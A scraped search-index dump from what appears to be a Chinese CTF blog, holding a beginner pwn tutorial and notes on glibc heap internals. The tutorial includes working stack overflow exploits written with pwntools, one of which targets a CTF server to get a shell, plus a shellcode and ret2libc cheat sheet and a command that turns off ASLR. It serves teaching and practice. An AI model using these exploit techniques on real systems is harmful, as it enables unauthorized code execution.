2023","permalink":"/tags/%E5%BC%82%E6%9E%84pwn/","section":"Tags","summary":"","title":"异构PWN"},{"content":"xia0o0o0o with some shit code\n","date":"August 24, 2023","permalink":"/link/xia0/","section":"友链/links","summary":"\u003cp\u003e\u003cstrong\u003exia0o0o0o with some shit code\u003c/strong\u003e\u003c/p\u003e","title":"KpwnZ"},{"content":"","date":"August 24, 2023","permalink":"/link/","section":"友链/links","summary":"","title":"友链/links"},{"content":"写给学弟学妹的pwn入门教程~\n0x00 概述 # Pwn是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。\u0026ndash; 《百度百科》\nPwn是CTF方向中的一种，主要是利用二进制漏洞从而获得 getShell（提权），即获得对方系统权限，从而控制对方电脑。\nPWN 的学习流程大概是这样的：\n从最基本的栈溢出漏洞开始学习，掌握最基本的栈溢出漏洞利用技巧 ret2text ret2syscall ret2shellcode ret2libc 32位及64位程序的ROP 格式化字符串漏洞（fmtstr） 整数溢出漏洞 及 数组越界漏洞 其他高级一点的栈溢出漏洞利用技巧 ret2csu ret2reg ret2dlresolve, ret2VDSO SROP BROP 花式栈溢出技巧 堆利用技巧 Off-By-One UAF Fastbin Attack Unsorted Bin attack Unlink Tcache attack Largebin attack house of XXX 内核安全 Linux Kernel Pwn 等等 以及还有其他架构的利用方式 ARM PWN 等等 PWN 的学习难度可能会有那么一点点大，有一定的学习门槛，需要投入不少的时间和精力去学习。\n但与此同时， PWN 也是一个十分有趣的方向，如果同学们对 pwn 感兴趣，对二进制安全感兴趣，也可以试着学习这个方向，如果在一段时间的学习后，还能够十分有热情地学习和实践，务必在二进制安全的路上坚持下去！\n网安一定要学会自己动手实践，总结经验，我之后可能会在 个人博客上发一些入门的文章，但还是建议大家自己根据推荐的教程去进行自学，在学习pwn及学习CTF时自学与善用搜索引擎都是不可或缺的。\n2023.8.30 更新：\n推荐大家阅读 Toka 师傅写的文章： CTF经验贴｜我们对PWN都有哪些误会 (qq.com)，Toka 师傅写的真的太好了，写到我这个菜狗pwn手的心里了😭\n0x01 入门教程推荐 # 学习链接：\nBinary Exploitation - COMPASS CTF Wiki\n南科大 COMPASS CTF Wiki 教程，简述了pwn部分的一些基础知识，可以让大家对pwn有更加全面的了解\n栈介绍 - CTF Wiki (ctf-wiki.org)\nCTF Wiki，是非常好的pwn学习资料，讲的细致且全面，入门可以从 栈部分 开始学习\n二进制安全 (yuque.com)\nyichen师傅写的二进制安全笔记，其中pwn入门部分是围绕 CTF Wiki 写的，可以两个一起学习\n学习书籍推荐：\nC/C++\n《C Primer Plus》 《C++ Primer Plus》 汇编语言\n《汇编语言》- 王爽 CTF相关\n《CTF 竞赛权威指南 PWN篇》 《从0到1 CTFer成长之路》 计算机原理\n《深入理解计算机系统》（大名鼎鼎的CSAPP） 《程序员的自我修养》 操作系统\n《操作系统真象还原》 《鸟哥的Linux私房菜》 《深入理解Linux内核》 逆向工程\n《逆向工程核心原理》 编译原理\n《编译器设计》（Engineering a Compiler） 《编译原理》(Dragon book) 其他推荐阅读的书籍\n《0day安全：软件漏洞分析技术》 《IDA Pro权威指南》 《漏洞战争 软件漏洞分析精要》 《加密与解密》 0x02 pwn环境与工具 # 关于pwn的环境搭建，\n使用Windows的同学可以参考：\nPWN环境二次搭建记录-Ubuntu 22.04 · ta0lve\n使用macOS的同学可以参考：\nMac 环境下 PWN入门系列（一）-安全客 - 安全资讯平台 (anquanke.com)\n在做pwn题时还会用到 IDA，安装和使用可以参考：\nIDA的新手入门指南_ida教程_Beth Harmon的博客-CSDN博客\n0x03 pwn做题平台 # 建议先从前三个平台的简单题开始做起~\n攻防世界 (xctf.org.cn)\n攻防世界的题目考察知识点很明确，循序渐进的学习，还可以选择题目难度，对新手十分友好。\nBUUCTF在线评测 (buuoj.cn)\n有近年以来各种比赛的题目，题目难度与排序没有必然联系，只是大体上是逐渐递增，前面的题目可能也会有一些难度，建议入门了再去开始做\n题库 | NSSCTF\n同上\npwnable.tw\n适合有一定基础的去做，题目质量很高，能够学到不少知识\npwnable.kr\n同上，建议有一点基础再开始做\npwnable.xyz\n同上\npwn.college\n基础知识讲解得很好，可以在实践中夯实计算机安全基础，不过对于CTF来说可能学习进程有慢，还是建议直接从前三个平台开始做题\n附录 # 1.栈溢出原理 # (copy from ctf-wiki)\n栈溢出原理 - CTF Wiki (ctf-wiki.org)\n介绍 ¶\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是\n程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 基本示例 ¶ # 最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，当然需要确保这个地址所在的段具有可执行权限。下面，我们举一个简单的例子：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void success() { puts(\u0026#34;You Hava already controlled it.\u0026#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } 这个程序的主要目的读取一个字符串，并将其输出。我们希望可以控制程序执行 success 函数。\n我们利用如下命令对其进行编译\n➜ stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example stack_example.c: In function ‘vulnerable’: stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration] gets(s); ^ /tmp/ccPU8rRA.o：在函数‘vulnerable’中： stack_example.c:(.text+0x27): 警告： the `gets\u0026#39; function is dangerous and should not be used. 可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，\n历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。\ngcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有--enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie。\n编译成功后，可以使用 checksec 工具检查编译出的文件：\n➜ stack-example checksec stack_example Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 /proc/sys/kernel/randomize_va_space 来控制 ASLR 启动与否，具体的选项有\n0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。 1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。 2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。 我们可以使用echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。\n为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。\n确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到\nint vulnerable() { char s; // [sp+4h] [bp-14h]@1 gets(\u0026amp;s); return puts(\u0026amp;s); } 该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为\n+-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ 并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。\n.text:0804843B success proc near .text:0804843B push ebp .text:0804843C mov ebp, esp .text:0804843E sub esp, 8 .text:08048441 sub esp, 0Ch .text:08048444 push offset s ; \u0026#34;You Hava already controlled it.\u0026#34; .text:08048449 call _puts .text:0804844E add esp, 10h .text:08048451 nop .text:08048452 leave .text:08048453 retn .text:08048453 success endp 那么如果我们读取的字符串为\n0x14*\u0026#39;a\u0026#39;+\u0026#39;bbbb\u0026#39;+success_addr 那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为\n+-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ 但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是\n\\x3b\\x84\\x04\\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \\，x 等也算一个单独的字符。。所以我们需要想办法将 \\x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：\n##coding=utf8 from pwn import * ## 构造与程序交互的对象 sh = process(\u0026#39;./stack_example\u0026#39;) success_addr = 0x0804843b ## 构造payload payload = \u0026#39;a\u0026#39; * 0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr) print p32(success_addr) ## 向程序发送字符串 sh.sendline(payload) ## 将代码交互转换为手工交互 sh.interactive() 执行一波代码，可以得到\n➜ stack-example python exp.py [+] Starting local process \u0026#39;./stack_example\u0026#39;: pid 61936 ;\\x84\\x0 [*] Switching to interactive mode aaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0 You Hava already controlled it. [*] Got EOF while reading in interactive $ [*] Process \u0026#39;./stack_example\u0026#39; stopped with exit code -11 (SIGSEGV) (pid 61936) [*] Got EOF while sending in interactive 可以看到我们确实已经执行 success 函数。\n小总结 ¶\n上面的示例其实也展示了栈溢出中比较重要的几个步骤。\n（1）寻找危险函数 ¶ # 通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下\n输入 gets，直接读取一行，忽略\u0026rsquo;\\x00' scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到\u0026rsquo;\\x00\u0026rsquo;停止 strcat，字符串拼接，遇到\u0026rsquo;\\x00\u0026rsquo;停止 bcopy （2）确定填充长度 ¶ # 这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求\n覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n2.基础栈溢出示例： # （W4terCTF-2023 Level 0 Tic-Tac-Toe）\n题目源码： # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int a[3][3]; void success() { system(\u0026#34;/bin/sh\u0026#34;); } void vulnerable() { char s[12]; // fflush(stdin); puts(\u0026#34;You win!!! Tell me your name:\u0026#34;); // fgets(s, 1000, stdin); gets(s); puts(\u0026#34;soooooooo cool!\u0026#34;); return; } void init() { setbuf(stdin, 0); setbuf(stdout, 0); alarm(60); } void outputBoard() { puts(\u0026#34;--------current chessBoard---------\u0026#34;); int i, j; for (i = 0; i \u0026lt; 3; i++) for (j = 0; j \u0026lt; 3; j++) { if (j == 0) printf(\u0026#34;|\u0026#34;); if (a[i][j] == 1) printf(\u0026#34;x\u0026#34;); if (a[i][j] == 2) printf(\u0026#34;o\u0026#34;); if (a[i][j] == 0) printf(\u0026#34; \u0026#34;); printf(\u0026#34;|\u0026#34;); if (j == 2) printf(\u0026#34;\\n\u0026#34;); } puts(\u0026#34;Let\u0026#39;s go!!\u0026#34;); } int checkBoard() { int i, j; for (i = 0; i \u0026lt; 3; i++) { if (a[i][0] != 0 \u0026amp;\u0026amp; a[i][0] == a[i][1] \u0026amp;\u0026amp; a[i][0] == a[i][2]) { return a[i][0]; } if (a[0][i] != 0 \u0026amp;\u0026amp; a[0][i] == a[1][i] \u0026amp;\u0026amp; a[0][i] == a[2][i]) { return a[0][i]; } } if (a[0][0] != 0 \u0026amp;\u0026amp; a[0][0] == a[1][1] \u0026amp;\u0026amp; a[1][1] == a[2][2]) { return a[1][1]; } if (a[0][2] != 0 \u0026amp;\u0026amp; a[0][2] == a[1][1] \u0026amp;\u0026amp; a[1][1] == a[2][0]) { return a[1][1]; } return 0; } bool play() { init(); srand(time(0)); int rest = 9; memset(a, 0, sizeof a); bool isNPC = false; while (rest \u0026gt; 0) { outputBoard(); if (isNPC) { puts(\u0026#34;My turn!\u0026#34;); int p = rand() % 3; if (p) { puts(\u0026#34;ooops, I suddenly fall asleep.......\u0026#34;); isNPC ^= 1; } else { isNPC ^= 1; p = rand() % rest; int i, j; for (i = 0; i \u0026lt; 3 \u0026amp;\u0026amp; p \u0026gt; 0; i++) for (j = 0; j \u0026lt; 3 \u0026amp;\u0026amp; p \u0026gt; 0; j++) if (a[i][j] == 0) { --p; if (p == 0) { a[i][j] = 2; printf(\u0026#34;I play at (%d, %d)\\n\u0026#34;, i, j); rest--; break; } } } } else { puts(\u0026#34;Your turn!\u0026#34;); puts(\u0026#34;Please give me a position(0-8):\u0026#34;); int pos = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;pos); getchar(); if (pos \u0026lt; 9 \u0026amp;\u0026amp; pos \u0026gt;= 0 \u0026amp;\u0026amp; a[pos / 3][pos % 3] == 0) { a[pos / 3][pos % 3] = 1; rest--; printf(\u0026#34;You play at: (%d, %d)\\n\u0026#34;, pos / 3, pos % 3); } else { int i, j, p; for (i = 0, p = 0; i \u0026lt; 3 \u0026amp;\u0026amp; p == 0; i++) for (j = 0; j \u0026lt; 3; j++) if (a[i][j] == 0) { a[i][j] = 1; p = 1; rest--; printf(\u0026#34;Wrong Position! I help you play at: (%d, %d)\\n\u0026#34;, i, j); break; } } isNPC ^= 1; } int tmp = checkBoard(); if (tmp == 0) { continue; } if (tmp == 2) { return false; } if (tmp == 1) { return true; } } return false; } int main(int argc, char **argv) { puts(\u0026#34;Welcome to ez Tic-Tac-Toe!\u0026#34;); if (!play()) { puts(\u0026#34;you loose! Try again!\u0026#34;); return 0; } vulnerable(); return 0; } 分析二进制文件： # (1).将程序拖入IDA中查看反汇编代码\n（也可以自己先利用题目给出的C语言源码搞清楚程序逻辑后再IDA分析） 可以看到当我们的游戏win时会让我们输入名字，且s字符串的大小只有16， (2).用鼠标点击变量s，可以查看vulnerable函数的栈，\n可以看到 s 的大小为0x14 - 0x4 = 0x10 = 16 s 离返回地址的距离为0x14 - 0x0 = 20 由32位栈调用的原理可知在跳到返回地址前函数栈还会pop ebp寄存器， 所以我们的填充数据段大小为20+4=24，\n(3).最后找到我们要跳转到后门函数（或者是可以get shell）的地址\n可以看到在地址为 0x08049236 的汇编代码是success函数的开始，所以我们的跳转的返回地址可以为 0x08049236 这里的返回地址还可以写0x08049242之前的其他地址： 0x08049237、0x08049239、0x0804923A、0x0804923D 但是0x08049242及之后的地址就不行了，因为转到这些地址时函数的get shell 指令就不能完整地执行 发送地址时我们用p32()来进行32位的小端打包字节并发送\nexp： # from pwn import* context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 26539) #taolve = process(\u0026#39;./0\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 填充字符 \u0026#39;\u0026#39;\u0026#39; offset = 24 #填充字符的长度 ret_adrr=0x08049236 payload = b\u0026#39;a\u0026#39;*offset + p32(ret_adrr) #我们要修改为的返回地址 taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) #填一个不合理的数字让电脑帮我们下棋（） #实际执行时发现我们随便填一个数字其实最后都是有可能win的，一次没win就两次（） taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Tell me your name:\\n\u0026#39;) taolve.sendline(payload) taolve.interactive() #最后转到交互模式后还需要使用linux命令行来得到flag #ls 指令来查看当前目录下有哪些文件和文件夹 #cat flag 来打印 flag \u0026#39;\u0026#39;\u0026#39; 如果出现下面这句话： [*] Got EOF while reading in interactive 则说明可能之前的栈溢出填充字符的长度计算错误， 或者是我们所填写的返回地址有错误， 比如未完成之前的必要汇编指令就强行执行一些指令 \u0026#39;\u0026#39;\u0026#39; 3. pwntools的基本使用 # # python3 from pwn import * # 导入python库 ### 0x01 环境设置 # 1 context.log_level = \u0026#39;debug\u0026#39; # 在对漏洞进行故障排除 context.arch = \u0026#39;i386\u0026#39; context.os = \u0026#39;linux\u0026#39; # 2 context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 3 context.binary = pwn_name # 从二进制文件推断目标架构、位与和字节序 ### 0x02 建立链接 io = remote(ip,port) # 创建与ip:port的链接 p = process(pwn_name) # 执行二进制文件process gdb.attach(p) # 在当前进程下调试二进制文件 ### 0x03 利用elf文件 elf = ELF(pwn_name) # 封装有关 ELF 文件的信息 func_addr = elf.sym[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的加载地址 func_got = elf.got[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的got表地址 func_plt = elf.plt[\u0026#34;func\u0026#34;] # 在ELF文件中查找函数的plt表地址 binsh_addr = elf.search(b\u0026#39;/bin/sh\u0026#39;).__next()__ # 在ELF文件中查找字符串 binsh_addr = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 ### 0x04 利用本地libc文件 libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc_base = puts_real_addr - libc.symbols[\u0026#39;puts\u0026#39;] binsh_addr = libc_base + libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__() # binsh_addr = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # 这个写法也可以 system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] ### 0x05 查找libc文件 from LibcSearcher import * libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_real_addr) libc_base = puts_real_addr - libc.dump(\u0026#39;puts\u0026#39;) log.success(\u0026#39;libc_base \u0026#39; + hex(libc_base)) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) ### 0x06 生成shellcode shellcode = shellcraft.sh() # 生成指定架构的shellcode 汇编语言 shellcode = asm(shellcode) # 转换为字节 ### 0x07 接收发送字节 p.recv(size) # 接收 size 个字节 默认全部接收 p.recvline() # 接收字节直至遇到b\u0026#39;\\n\u0026#39; p.recvuntil(string) # 接受字节直到遇到 string p.send(data) # 发送 data p.sendline(data) # 发送 data 在后面加 b\u0026#39;\\n\u0026#39; p.sendafter(data) # 在接收 string 后发送data p.sendlineafter(string,data) # 在接收 string 后发送data 在后面加 \u0026#39;\\n\u0026#39; p64(data) # 将 data 转换为64位小端序字节 也可以为32/16/8位字节 u64(data) # 将 data 转换为64位大端序字节 也可以为32/16/8位字节 ### 0x08 创建一个交互shell p.interactive() 还可以看看：\npwntools — pwntools 4.10.0 documentation\n4. 学习路线 # 最后再放一张学习pwn的路线图，来源于华科的 C0lin 师傅：\npwn学习路线图\n同学们可以按照图中的绿色→黄色→红色的顺序学习pwn\n还可以继续往下阅读学习本系列的文章：\nPWN环境二次搭建记录-Ubuntu 22.04 July 10, 2023\u0026middot;9775 字\u0026middot;20 分钟 pwn入门 CTF PWN Ubuntu Linux命令入门与总结 July 14, 2023\u0026middot;4854 字\u0026middot;10 分钟 pwn入门 CTF PWN Ubuntu Linux 5.参考链接 # 栈溢出原理 - CTF Wiki (ctf-wiki.org)\n","date":"August 5, 2023","permalink":"/posts/pwn/basic/tutorial22/","section":"Posts","summary":"\u003cp\u003e写给学弟学妹的pwn入门教程~\u003c/p\u003e","title":"pwn入门教程"},{"content":"","date":"July 31, 2023","permalink":"/tags/heap/","section":"Tags","summary":"","title":"heap"},{"content":" 如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 堆的概念 # 在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。（from wiki）\n堆的实现 # dlmalloc : Genral purpose allocator\njemalloc : Freebsd and Firefox\ntcmalloc : Google\nlibumen : Solaris\nptmalloc2 : glibc\n堆的实现以ptmalloc2中堆的实现为主\n在 glibc-2.3.x. 之后，glibc 中集成了ptmalloc2，可以 下载glibc源码 查看ptmalloc\nIndex of /gnu/glibc\n查看glibc版本\n# shell: ldd --version # 输出： ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35 glibc内存管理流程图（看不清楚可以保存下来放大）：\nglibc运行时库分配动态内存，底层用的是malloc来实现(new 最终也是调用malloc)，下面是malloc函数调用流程图：\n堆管理器\n堆管理器位于程序与内核之间，主要做两件事：\n响应用户申请内存的请求 （请求堆） 为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存（虚拟内存），即 top _chunk 只有当真正访问一个地址的时候，系统才会在虚拟内存和物理页面的映射关系。 所以这里的内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理内存给用户使用。 只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互 新创建一个top_chunk，并且把原来的top_chunk分配到unsorted_bin 里面 管理用户所释放的内存 （释放堆） 用户释放的内存并不是直接返还给操作系统，而是由堆管理器进行管理，除了fastbin以外大都由bins来管理 这些释放的内存可以用来响应用户新申请的内存的请求。 系统所调用的函数\nmalloc和free在动态申请或释放内存时，主要是调用(s)brk和mmap,unmmap函数实现的。\n(s)brk函数机制 # include \u0026lt;stdio.h\u0026gt; # include \u0026lt;unistd.h\u0026gt; # include \u0026lt;sys/types.h\u0026gt; int main() { void *cuur_bkr,*tmp_brk = NULL; printf(\u0026#34;%d\\n\u0026#34;,getid()); tm_brk = curr_brk = sbrk(0); //给当前程序一个brk printf(\u0026#34;%p\\n\u0026#34;,curr_brk); getchar(); brk(curr_brk+4096); //设置结尾位置,即分配了4096字节的堆块 curr_brk=sbrk(0); printf(\u0026#34;%p\\n\u0026#34;,curr_brk); getchar(); brk(tmp_brk); curr_brk=sbrk(0); printf(\u0026#34;%p\\n\u0026#34;,curr_brk); getchar(); return 0; } 用于设置program_break指向的位置\nsbrk()函数\n同brk()，参数可以是负数。执行成功返回上一次program_break的值，可以设置参数为0返回当前的program_break 初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同\n开启ASLR后，BSS segment和heap间存在Random brk offset\n关闭ASLR后，堆开始地址和数据段结束地址重合\n不开启ASLR时，start_brk以及brk会指向data/bss段的结尾 sbrk创建的chunk紧邻数据段\nmmap函数机制 当用户申请空间大于等于128kb，也就是0x20000字节时，不再使用brk()进行分配，改为使用mmap() malloc会使用mmap来创建独立的匿名映射段。 匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用，这块内存为系统随机分配。 munmap用于释放内存。 mmap创建的chunk紧邻libc unmmap()函数将mmap()申请的空间进行回收 多线程支持\n在原来的dlmalloc实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程必须等待直到临界区中不再有线程。 这是因为所有的线程共享一个堆。 在glibc和ptmalloc实现中，支持了多线程的快速访问，在新的实现中，所有的线程共享多个堆。 详见 wiki\n堆的微观结构 # 先补充两句，个人认为从总体上看可以把堆的数据结构分为微观结构和宏观结构：\n微观结构主要是malloc_chunk的数据与结构： prev_size size fd，bk fd_nextsize， bk_nextsize 宏观结构包括堆块的宏观信息，可以使我们更好地了解glibc的堆管理实现，宏观结构分为以下几个部分： arena \u0026amp; main_arena：可以看作是堆块的管理器，但其实就是堆内存本身 bin：用链表结构管理被free的malloc_chunk（堆块） top_chunk：处于一个arena的最顶部(即最高内存地址处)、不属于任何bin的一片内存 malloc_state：管理 arena 的核心结构，包含堆的状态信息、bins 链表等 main arena 对应的 malloc state 结构存储在 glibc 全局变量中 其他线程 arena 对应的 malloc_state 存储在 arena 本身中 SIZE_SZ 与 size_t # 先补充一个小知识，关于堆中结构我们常常会看到SIZE_SZ 与 size_t，但实际上，在一般场景里他们两个的值是一样的，即在32位系统中是8字节，在64位系统中是16字节。\n下载glibc源码查看ptmalloc可以看到：\n#ifndef INTERNAL_SIZE_T #define INTERNAL_SIZE_T size_t #endif /* The corresponding word size. */ #define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) INTERNAL_SIZE_T：size_t，为32/64位整数（8字节/16字节） SIZE_SZ：同size_t，8字节/16字节 chunk # chunk是glibc管理内存的基本单元。主要分为以下几类：\nalloced chunk：已分配正在使用中的chunk。 free chunk：已经free的chunk。 top chunk：可以理解为地址的最高处，还没有分配的chunk。 last remainder chunk：是为了提高内存分配的局部性。 chunk = chunk header + user data，malloc返回给用户的其实是user data指针，具体如下图：\nmalloc_chunk的结构如下：\nstruct malloc_chunk { INTERNAL_SIZE_T prev_size; /* 如果前面一个堆块是空闲的则表示前一个堆块的大小,否则无意义 */ INTERNAL_SIZE_T size; /* 当前chunk的大小，由于对齐的原因所以低三位作为标志位*/ /*###################### 1.真正的内存从这里开始分配 2.malloc之后这些指针没有用,这时存放的是数据 3.只有在free之后才有效。 ########################*/ struct malloc_chunk* fd; /* 当chunk空闲时才有意义,记录后一个空闲chunk的地址 */ struct malloc_chunk* bk; /* 同上,记录前一个空闲chunk的地址 */ /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /*当前chunk为largebin时才有意义，指向下一个与当前chunk大小不同的第一个空闲块*/ struct malloc_chunk* bk_nextsize;/*指向上一个与当前chunk大小不同的第一个空闲块*/ }; 每个字段的具体的解释如下（from wiki and zhihu）\nprev_size # 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。 否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。 当申请的内存大小对 2*SIZE_SZ 取余之后小于等于 size_t 的话就可以用它的下一个 chunk 的 prev_size 比如：64位下 malloc(0x55)， 0x58 mod 0x10 还差 0x8 \u0026lt;= 0x8字节，那他就可以用后面一个 chunk 的 prev_size，最后加上 chunk header 大小是 0x60（所以下图为6行） 还是 64 位下，如果大小是 0x59 的话 mod 0x10之后还差 0x9 \u0026gt; 0x8字节，那就不够用了，只能多申请一块，最后加上 chunk header 用了 0x70（所以下图为7行） malloc(0x58)会分配0x60的内存 malloc(0x59)会分配0x70的内存 size # 该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。 SIZE_SZ 在32位系统下是 32位 即4个字节大小，在64位系统下是 64位 即8个字节大小 所以64位chunk的size必须是16字节对齐，32位chunk的size必须是8 字节对齐 64位 低4位没用 11110000 32位 低3位没用 11111000 关于16字节对齐： 1字节为8位，即2个16进制位（如 0xff ），所以16字节为32个16进制位 在gdb中体现为 0x0011223344556677 0x8899aabbccddeeff 为16字节 NON_MAIN_ARENA，A：倒数第三位表示当前chunk属于主分配区(0)还是非主分配区(1) IS_MAPPED，M：倒数第二位表示当前chunk是从mmap(1)[多线程]分配的，还是从brk(0)[子线程]分配的 PREV_INUSE， P：最低位表示前一个 chunk 块是否被分配。 一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。 当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 对于fastbin的堆块,不管前面还有没有被分配的chunk，P位都为1 。 一些基础的攻击思路： # chunk1的数据有效区域覆盖到chunk2的prev_size位,并且chunk2的size位的prev_inuse被覆盖为0。系统认为chunk2之前的chunk1已经未在使用了。 当free(chunk2)的时候,系统会将chunk2与chunk2中prev_size大小的空间合并到bins。 我们可以通过改变chunk2的prev_size的内容,操纵向前合并的大小。 造成的问题：overlap(堆块重叠)，chunk1被释放了，但是我们可以操纵修改它(堆利用的核心思想)，从而修改bins链的内容，泄露其中的地址。 形成的攻击：fastbin \u0026mdash;\u0026gt; fd \u0026mdash;\u0026gt; main_arena \u0026mdash;\u0026gt; 分配新的堆块，我们通过修改chunk1的fd内容，达到分配任意内存的目的，造成fastbin attack。 最小堆原则 : malloc(0)会分配0x20的空间,prev_size + size + 数据对齐的0x10字节 fd，bk # 